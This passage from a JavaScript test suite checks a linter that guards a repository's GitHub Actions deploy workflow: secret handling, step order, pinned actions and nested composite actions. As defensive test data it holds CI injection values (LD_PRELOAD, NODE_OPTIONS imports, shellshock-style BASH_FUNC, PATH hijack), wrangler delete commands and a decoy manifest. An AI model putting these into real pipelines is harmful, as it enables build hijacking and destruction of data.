      ).toMatch(/--var VERSION (must be|is missing)/);
    });
  });

  describe('public values come from GitHub variables, never secrets', () => {
    it.each([
      ['CANDIDATE_TOKEN_KID', API],
      ['CANDIDATE_TOKEN_PUBLIC_JWK', API],
      ['CANDIDATE_TOKEN_PUBLIC_JWK', EDGE],
      ['SUPABASE_STAGING_URL', API],
      ['SUPABASE_STAGING_PUBLISHABLE_KEY', API],
      ['SENTRY_DSN_WORKERS', JOBS],
      ['CANDIDATE_TOKEN_KID', GUARD],
      ['CANDIDATE_TOKEN_PUBLIC_JWK', GUARD],
    ])('rejects %s on %s taken from a secret, a literal or another variable', (name, step) => {
      for (const value of [
        `\${{ secrets.${name} }}`,
        'a-literal',
        '${{ vars.SOMETHING_ELSE }}',
        `\${{ vars.${name} }}${'x'}`,
      ]) {
        expect(
          check((d) => (find(d, step).env[name] = value)),
          `${name} ${value}`,
        ).toMatch(new RegExp(`env: ${name} must be exactly \\$\\{\\{ vars\\.${name} \\}\\}`));
      }
    });

    it('lists the five public deploy variables and their vars sources', () => {
      expect(PUBLIC_DEPLOY_ENV).toEqual({
        CANDIDATE_TOKEN_KID: '${{ vars.CANDIDATE_TOKEN_KID }}',
        CANDIDATE_TOKEN_PUBLIC_JWK: '${{ vars.CANDIDATE_TOKEN_PUBLIC_JWK }}',
        SENTRY_DSN_WORKERS: '${{ vars.SENTRY_DSN_WORKERS }}',
        SUPABASE_STAGING_URL: '${{ vars.SUPABASE_STAGING_URL }}',
        SUPABASE_STAGING_PUBLISHABLE_KEY: '${{ vars.SUPABASE_STAGING_PUBLISHABLE_KEY }}',
      });
      expect(Object.isFrozen(PUBLIC_DEPLOY_ENV)).toBe(true);
    });

    it('rejects a deploy step that uses a source variable it does not set', () => {
      expect(check((d) => delete find(d, API).env.CANDIDATE_TOKEN_KID)).toMatch(
        /\$CANDIDATE_TOKEN_KID .*env:/,
      );
    });
  });

  describe('the public-variable guard (review F4)', () => {
    it('is required, exactly node scripts/check-deploy-vars.mjs', () => {
      expect(
        check(
          (d) => (d.jobs['deploy-staging'].steps = stepsOf(d).filter((s) => s !== find(d, GUARD))),
        ),
      ).toMatch(/node scripts\/check-deploy-vars\.mjs/);
      for (const run of [
        'node scripts/check-deploy-vars.mjs || true',
        'node scripts/check-deploy-vars.mjs\necho done',
        'node scripts/check-deploy-vars.mjs --skip',
        '# node scripts/check-deploy-vars.mjs',
      ]) {
        expect(
          check((d) => (find(d, GUARD).run = run)),
          run,
        ).toMatch(/node scripts\/check-deploy-vars\.mjs/);
      }
    });

    it('must come before the migrations and before every Worker deploy', () => {
      expect(
        check((d) => {
          const s = stepsOf(d);
          const g = find(d, GUARD);
          s.splice(s.indexOf(g), 1);
          s.splice(s.indexOf(find(d, API)) - 1, 0, g);
        }),
      ).toMatch(/check-deploy-vars\.mjs.*before the migrations/);
      expect(
        check((d) => {
          const s = stepsOf(d);
          const g = find(d, GUARD);
          s.splice(s.indexOf(g), 1);
          s.splice(s.indexOf(find(d, EDGE)), 0, g);
        }),
      ).toMatch(/check-deploy-vars\.mjs.*before/);
    });

    it('must see all four required values and hold no secret', () => {
      for (const name of [
        'CANDIDATE_TOKEN_KID',
        'CANDIDATE_TOKEN_PUBLIC_JWK',
        'SUPABASE_STAGING_URL',
        'SUPABASE_STAGING_PUBLISHABLE_KEY',
      ]) {
        expect(
          check((d) => delete find(d, GUARD).env[name]),
          name,
        ).toMatch(new RegExp(`check-deploy-vars.*sets? ${name}`));
      }
      expect(
        check(
          (d) => (find(d, GUARD).env.CLOUDFLARE_API_TOKEN = '${{ secrets.CLOUDFLARE_API_TOKEN }}'),
        ),
      ).toMatch(/does not use it/);
    });
  });

  describe('idempotent buckets and queues (review F5)', () => {
    it('are created by exactly node scripts/ensure-staging-resources.mjs, before the first deploy', () => {
      expect(
        check(
          (d) =>
            (d.jobs['deploy-staging'].steps = stepsOf(d).filter((s) => s !== find(d, RESOURCES))),
        ),
      ).toMatch(/node scripts\/ensure-staging-resources\.mjs/);
      for (const run of [
        'node scripts/ensure-staging-resources.mjs --delete',
        'node scripts/ensure-staging-resources.mjs\nwrangler r2 bucket delete trace-evidence-staging',
      ]) {
        expect(
          check((d) => (find(d, RESOURCES).run = run)),
          run,
        ).toMatch(/node scripts\/ensure-staging-resources\.mjs/);
      }
      expect(check((d) => swap(d, RESOURCES, API))).toMatch(
        /ensure-staging-resources\.mjs.*before the first/,
      );
    });

    it('may hold the Cloudflare token (it calls wrangler), and no other step that does not use it may', () => {
      expect(check(() => {})).toBe('');
      expect(check((d) => (find(d, RESOURCES).run = 'node scripts/something-else.mjs'))).toMatch(
        /CLOUDFLARE_API_TOKEN.*does not use it/,
      );
    });

    it('never runs a wrangler delete anywhere in the workflow', () => {
      expect(
        check(
          (d) =>
            (stepsOf(d)[2].run += '\npnpm exec wrangler r2 bucket delete trace-evidence-staging'),
        ),
      ).toMatch(/wrangler .*delete/);
      expect(
        check(
          (d) =>
            (stepsOf(d)[2].run +=
              '\npnpm exec wrangler queues delete trace-session-mirror-staging'),
        ),
      ).toMatch(/wrangler .*delete/);
    });
  });

  describe('secrets check and production', () => {
    it('keeps check-staging-secrets after the last Worker deploy', () => {
      expect(check((d) => swap(d, 'Check Worker secrets', EDGE))).toMatch(
        /check-staging-secrets must run after the last Worker deploy/,
      );
      expect(
        check(
          (d) =>
            (d.jobs['deploy-staging'].steps = stepsOf(d).filter(
              (s) => s.name !== 'Check Worker secrets',
            )),
        ),
      ).toMatch(/check-staging-secrets must run after the last Worker deploy/);
    });

    it('allows no production environment or job', () => {
      expect(check((d) => (d.jobs['deploy-staging'].environment = 'production'))).toMatch(
        /must use environment: staging/,
      );
      expect(
        check(
          (d) =>
            (d.jobs['deploy-production'] = {
              environment: 'production',
              'runs-on': 'ubuntu-24.04',
              steps: [{ run: 'true' }],
            }),
        ),
      ).toMatch(/only deploy-staging may use an environment/);
    });
  });
});

describe('the real ci.yml deploy chain (d1 §7.1)', () => {
  const REPO_ROOT = fileURLToPath(new URL('../../', import.meta.url));
  const real = parseYaml(
    readFileSync(path.join(REPO_ROOT, '.github', 'workflows', 'ci.yml'), 'utf8'),
  );
  const steps = real.jobs['deploy-staging'].steps;

  it('can be dispatched by hand and still deploys main only on push', () => {
    expect(Object.keys(real.on)).toEqual(['pull_request', 'push', 'workflow_dispatch']);
    expect(real.on.push.branches).toContain('main');
    expect(real.jobs['deploy-staging'].if).toBe(DEPLOY_IF);
    expect(real.jobs['deploy-staging'].environment).toBe('staging');
  });

  it('deploys api, then jobs, then edge, after the guard and the bucket and queue step', () => {
    const at = (re) => steps.findIndex((s) => re.test(s.run ?? ''));
    const guard = at(/^\s*node scripts\/check-deploy-vars\.mjs\s*$/);
    const migrate = at(/supabase db push/);
    const resources = at(/^\s*node scripts\/ensure-staging-resources\.mjs\s*$/);
    const deploys = steps
      .map((s, i) => [s, i])
      .filter(([s]) => /wrangler deploy/.test(s.run ?? '') && !/--dry-run/.test(s.run));
    expect(deploys.map(([s]) => s['working-directory'])).toEqual([
      'services/api',
      'workers/jobs',
      'workers/edge',
    ]);
    expect(guard).toBeGreaterThan(-1);
    expect(guard).toBeLessThan(migrate);
    expect(resources).toBeGreaterThan(migrate);
    expect(resources).toBeLessThan(deploys[0][1]);
    expect(at(/check-staging-secrets/)).toBeGreaterThan(deploys[2][1]);
  });

  it('passes every public var with --var from a GitHub variable, none from a secret', () => {
    const text = JSON.stringify(steps);
    for (const name of Object.keys(PUBLIC_DEPLOY_ENV)) {
      expect(text, name).not.toContain(`secrets.${name}`);
    }
  });
});

describe('checkAction (local composite actions)', () => {
  it('rejects an unpinned uses, a secret and continue-on-error', () => {
    const a = parseYaml(ACTION);
    a.runs.steps[0].uses = 'pnpm/action-setup@v6';
    a.runs.steps[2].env = { T: '${{ secrets.X }}' };
    a.runs.steps[1]['continue-on-error'] = true;
    const m = msgs(checkAction(a, 'action.yml'));
    expect(m).toMatch(/not pinned/);
    expect(m).toMatch(/secrets/);
    expect(m).toMatch(/continue-on-error/);
  });

  it('rejects VITE_SUPABASE_* in a composite action step env (B4-SEC-2)', () => {
    const a = parseYaml(ACTION);
    a.runs.steps[2].env = { VITE_SUPABASE_URL: '${{ vars.SUPABASE_STAGING_URL }}' };
    expect(msgs(checkAction(a, 'action.yml'))).toMatch(/VITE_SUPABASE_URL may be set only/);
  });

  it('rejects a non-composite local action', () => {
    expect(msgs(checkAction({ runs: { using: 'node24', main: 'x.js' } }, 'a.yml'))).toMatch(
      /composite/,
    );
  });
});

// The fixture's setup step and the build step after it (which carries the §2.7 build variables).
const BUILD_STEP = [
  '      - uses: ./.github/actions/setup',
  '      - env:',
  '          VITE_SUPABASE_URL: ${{ vars.SUPABASE_STAGING_URL }}',
  '          VITE_SUPABASE_PUBLISHABLE_KEY: ${{ vars.SUPABASE_STAGING_PUBLISHABLE_KEY }}',
  '        run: pnpm build',
].join('\n');

describe('runChecks over a fixture repository', () => {
  const repo = (files) => {
    const root = makeTempDir();
    writeFiles(root, files);
    return root;
  };

  it('passes the fixture workflow and action', () => {
    const root = repo({
      '.github/workflows/ci.yml': CI,
      '.github/actions/setup/action.yml': ACTION,
    });
    expect(runChecks(root)).toEqual([]);
  });

  it('fails when there is no workflow at all', () => {
    expect(msgs(runChecks(repo({ 'README.md': 'x' })))).toMatch(/no workflow files/);
  });

  it('fails when a required job is missing from every workflow', () => {
    const d = CI.replace(/\n {2}rls:\n[\s\S]*?\n\n/, '\n');
    const root = repo({
      '.github/workflows/ci.yml': d,
      '.github/actions/setup/action.yml': ACTION,
    });
    expect(msgs(runChecks(root))).toMatch(/required job "rls"/);
  });

  it('fails when a local action is missing or itself breaks a rule', () => {
    const missing = repo({ '.github/workflows/ci.yml': CI });
    expect(msgs(runChecks(missing))).toMatch(/\.github\/actions\/setup.*not found/);
    const bad = repo({
      '.github/workflows/ci.yml': CI,
      '.github/actions/setup/action.yml': ACTION.replace(/action-setup@2+/, 'action-setup@v6'),
    });
    expect(msgs(runChecks(bad))).toMatch(/action\.yml.*not pinned/);
  });

  it('counts an install inside a local action, so a secret passed to it fails', () => {
    const d = CI.replace(
      BUILD_STEP,
      // No build step after it: only the install inside the action makes step 1 an install step.
      '      - uses: ./.github/actions/setup\n        env:\n          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}',
    );
    expect(d).not.toBe(CI);
    const root = repo({
      '.github/workflows/ci.yml': d,
      '.github/actions/setup/action.yml': ACTION,
    });
    expect(msgs(runChecks(root))).toMatch(/deploy-staging\.steps\[1\].*install/);
  });

  it('reports a YAML error as a violation, and checks .yaml files too', () => {
    const root = repo({
      '.github/workflows/ci.yml': CI,
      '.github/workflows/other.yaml': 'on: push\non: pull_request\n',
      '.github/actions/setup/action.yml': ACTION,
    });
    expect(msgs(runChecks(root))).toMatch(/duplicate key "on"/);
  });

  it('CLI: exits 0 on a clean repo and 1 with the violations on stderr', () => {
    const script = fileURLToPath(new URL('../check-workflows.mjs', import.meta.url));
    const good = repo({
      '.github/workflows/ci.yml': CI,
      '.github/actions/setup/action.yml': ACTION,
    });
    const ok = spawnSync(process.execPath, [script, good], { encoding: 'utf8' });
    expect(ok.status).toBe(0);
    expect(ok.stdout).toMatch(/check-workflows: OK/);
    const bad = repo({
      '.github/workflows/ci.yml': CI.replace('contents: read', 'contents: write'),
      '.github/actions/setup/action.yml': ACTION,
    });
    const fail = spawnSync(process.execPath, [script, bad], { encoding: 'utf8' });
    expect(fail.status).toBe(1);
    expect(fail.stderr).toMatch(/ci\.yml \(permissions\).*\n[\s\S]*1 violation/);
  });

  it('rejects a second workflow with a job named like a required job (S1.4 review MED 4)', () => {
    const other = (job, extra = '') =>
      [
        'on: push',
        'permissions:',
        '  contents: read',
        'jobs:',
        `  ${job}:`,
        '    runs-on: ubuntu-24.04',
        extra,
        '    steps:',
        '      - run: "true"',
      ]
        .filter(Boolean)
        .join('\n');
    for (const [label, text] of [
      ['same id', other('security')],
      ['id differing by case', other('Security')],
      ['name: of another job', other('x', '    name: security')],
    ]) {
      const root = repo({
        '.github/workflows/ci.yml': CI,
        '.github/workflows/other.yml': text,
        '.github/actions/setup/action.yml': ACTION,
      });
      expect(msgs(runChecks(root)), label).toMatch(/required job "security"/);
    }
  });

  describe('nested local actions (S1.4 review MED 3)', () => {
    const composite = (steps) =>
      ['runs:', '  using: composite', '  steps:', ...steps.map((s) => `    - ${s}`)].join('\n');

    it('checks an action used by another action, by the same rules', () => {
      const root = repo({
        '.github/workflows/ci.yml': CI,
        '.github/actions/setup/action.yml': `${ACTION}\n    - uses: ./.github/actions/inner\n`,
        '.github/actions/inner/action.yml': composite(['uses: evil/action@main']),
      });
      expect(msgs(runChecks(root))).toMatch(/inner\/action\.yml.*not pinned/);
    });

    // S1.4 security re-review N4: GitHub runs action.yml, so a second manifest could be a decoy.
    it('fails when one action directory holds both action.yml and action.yaml', () => {
      const root = repo({
        '.github/workflows/ci.yml': CI,
        '.github/actions/setup/action.yml': ACTION,
        '.github/actions/setup/action.yaml': ACTION,
      });
      expect(msgs(runChecks(root))).toMatch(/setup.*both action\.yml and action\.yaml/);
    });

    it('fails when a nested local action is missing', () => {
      const root = repo({
        '.github/workflows/ci.yml': CI,
        '.github/actions/setup/action.yml': `${ACTION}\n    - uses: ./.github/actions/gone\n`,
      });
      expect(msgs(runChecks(root))).toMatch(
        /setup\/action\.yml.*\.\/\.github\/actions\/gone.*not found/,
      );
    });

    it('fails when a nested local action lives outside .github/actions', () => {
      const root = repo({
        '.github/workflows/ci.yml': CI,
        '.github/actions/setup/action.yml': `${ACTION}\n    - uses: ./tools/evil\n`,
        'tools/evil/action.yml': composite(['run: "true"\n      shell: bash']),
      });
      expect(msgs(runChecks(root))).toMatch(/setup\/action\.yml.*\.\/tools\/evil.*not found/);
    });

    it('fails on a cycle of local actions instead of looping', () => {
      const root = repo({
        '.github/workflows/ci.yml': CI,
        '.github/actions/setup/action.yml': `${ACTION}\n    - uses: ./.github/actions/a\n`,
        '.github/actions/a/action.yml': composite(['uses: ./.github/actions/b']),
        '.github/actions/b/action.yml': composite(['uses: ./.github/actions/a']),
      });
      expect(msgs(runChecks(root))).toMatch(/cycle/);
    });

    it('counts an install in a nested action, so a secret on a step using the outer one fails', () => {
      const d = CI.replace(
        BUILD_STEP,
        '      - uses: ./.github/actions/outer\n        env:\n          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}',
      );
      expect(d).not.toBe(CI);
      const root = repo({
        '.github/workflows/ci.yml': d,
        '.github/actions/setup/action.yml': ACTION,
        '.github/actions/outer/action.yml': composite(['uses: ./.github/actions/setup']),
      });
      expect(msgs(runChecks(root))).toMatch(/deploy-staging\.steps\[1\].*install/);
    });
  });

  // S1.4 N8/N9 security review N10, on the real files: the repository's own .github passes, and
  // each repro from the review, added to the real ci.yml, fails.
  describe('the real .github (N10)', () => {
    const REPO_ROOT = fileURLToPath(new URL('../../', import.meta.url));
    const real = (rel) => readFileSync(path.join(REPO_ROOT, ...rel.split('/')), 'utf8');
    const REAL_CI = real('.github/workflows/ci.yml');
    const REAL_ACTION = real('.github/actions/setup/action.yml');
    const ANCHOR = "  WRANGLER_SEND_METRICS: 'false'\n";

    it('passes the real ci.yml and setup action', () => {
      expect(runChecks(REPO_ROOT)).toEqual([]);
      const script = fileURLToPath(new URL('../check-workflows.mjs', import.meta.url));
      const r = spawnSync(process.execPath, [script], { encoding: 'utf8' });
      expect(r.stderr).toBe('');
      expect(r.status).toBe(0);
      expect(r.stdout).toMatch(/check-workflows: OK/);
    });

    it.each([
      ['BASH_FUNC_pnpm%%', '"() { :; }"'],
      ['NODE_OPTIONS', '--import=data:text/javascript,process.exit(0)'],
      ['pnpm_config_script_shell', '"true"'],
      ['LD_PRELOAD', './x.so'],
      ['PATH', './bin'],
      ['ACTIONS_ALLOW_UNSECURE_COMMANDS', "'true'"],
    ])('fails when the workflow env: of the real ci.yml sets %s', (name, value) => {
      expect(REAL_CI).toContain(ANCHOR);
      const root = repo({
        '.github/workflows/ci.yml': REAL_CI.replace(ANCHOR, `${ANCHOR}  ${name}: ${value}\n`),
        '.github/actions/setup/action.yml': REAL_ACTION,
      });
      expect(msgs(runChecks(root))).toMatch(
        new RegExp(`ci\\.yml \\(env\\): env: may not set ${name.replace(/[%$]/g, '\\$&')}`),
      );
    });

    it('fails when a step of the real ci.yml sets its whole env: from an expression', () => {
      const step = '      - name: Typecheck\n        run: pnpm typecheck\n';
      expect(REAL_CI).toContain(step);
      const whole = `        env: \${{ fromJSON('{"SHELLOPTS":"noexec"}') }}\n`;
      const root = repo({
        '.github/workflows/ci.yml': REAL_CI.replace(step, step + whole),
        '.github/actions/setup/action.yml': REAL_ACTION,
      });
      expect(msgs(runChecks(root))).toMatch(/jobs\.static\.steps\[2\]\): env: must be a mapping/);
    });

    it('fails when a step of the real setup action sets NODE_OPTIONS', () => {
      const anchor = '        GITLEAKS_VERSION: 8.30.1\n';
      expect(REAL_ACTION).toContain(anchor);
      const root = repo({
        '.github/workflows/ci.yml': REAL_CI,
        '.github/actions/setup/action.yml': REAL_ACTION.replace(
          anchor,
          `${anchor}        NODE_OPTIONS: --import=data:text/javascript,process.exit(0)\n`,
        ),
      });
      expect(msgs(runChecks(root))).toMatch(
        /setup\/action\.yml \(runs\.steps\[2\]\): env: may not set NODE_OPTIONS/,
      );
    });

    it('fails when a step of the real ci.yml exports NODE_OPTIONS in its run: text', () => {
      const step = '      - name: Typecheck\n        run: pnpm typecheck\n';
      expect(REAL_CI).toContain(step);
      const root = repo({
        '.github/workflows/ci.yml': REAL_CI.replace(
          step,
          step.replace('run: pnpm', 'run: export NODE_OPTIONS=--import=./x.mjs && pnpm'),
        ),
        '.github/actions/setup/action.yml': REAL_ACTION,
      });
      expect(msgs(runChecks(root))).toMatch(
        /ci\.yml \(jobs\.static\.steps\[2\]\): run: may only read NODE_OPTIONS \(as/,
      );
    });

    it('fails when the real setup action adds a directory to PATH other than its own', () => {
      const line = '        echo "$RUNNER_TEMP/gitleaks" >> "$GITHUB_PATH"\n';
      expect(REAL_ACTION).toContain(line);
      const root = repo({
        '.github/workflows/ci.yml': REAL_CI,
        '.github/actions/setup/action.yml': REAL_ACTION.replace(
          line,
          '        echo "$GITHUB_WORKSPACE/bin" >> "$GITHUB_PATH"\n',
        ),
      });
      expect(msgs(runChecks(root))).toMatch(
        /setup\/action\.yml \(runs\.steps\[2\]\): run: may not write GITHUB_PATH/,
      );
    });
  });

  it('applies the rules to every workflow file', () => {
    const root = repo({
      '.github/workflows/ci.yml': CI,
      '.github/workflows/extra.yml': [
        'on: workflow_run',
        'permissions:',
        '  contents: read',
        'jobs:',
        '  x:',
        '    runs-on: ubuntu-24.04',
        '    steps:',
        '      - uses: actions/checkout@v7',
      ].join('\n'),
      '.github/actions/setup/action.yml': ACTION,
    });
    const m = msgs(runChecks(root));
    expect(m).toMatch(/extra\.yml.*workflow_run/);
    expect(m).toMatch(/extra\.yml.*not pinned/);
    expect(m).toMatch(/extra\.yml.*persist-credentials/);
  });
});
